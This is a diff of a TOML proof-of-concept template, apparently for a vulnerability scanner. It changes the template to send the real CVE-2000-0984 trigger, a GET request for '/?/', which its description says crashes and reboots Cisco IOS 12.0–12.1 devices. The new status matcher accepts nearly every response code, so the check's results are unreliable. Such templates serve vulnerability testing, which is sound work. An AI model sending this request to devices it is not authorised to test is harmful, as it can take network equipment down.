@@ -1,12 +1,15 @@
 [info]
 author = "ave"
-description = "AVE-2000-0718 verification"
+description = "Cisco IOS 12.0-12.1 HTTP服务器在处理包含'?/'的URL时存在拒绝服务漏洞，发送特制HTTP GET请求可触发设备崩溃重启"
 id = "POC-AVE-2000-0718"
-name = "CVE-2000-0984 PoC"
+name = "Cisco IOS HTTP Server ?/ DoS PoC"
 severity = "medium"
 tags = [
     "cve-2000-0984",
-    "ave-2000-0718",
+    "cisco",
+    "ios",
+    "dos",
+    "http",
 ]
 vuln_id = [
     "CVE-2000-0984",
@@ -14,14 +17,21 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}"
+path = "/?/"
 protocol = "http"
 
 [[poc.requests.matchers]]
 expect = true
-status = [200]
+status = [
+    200,
+    400,
+    401,
+    403,
+    404,
+    500,
+]
 type = "status"
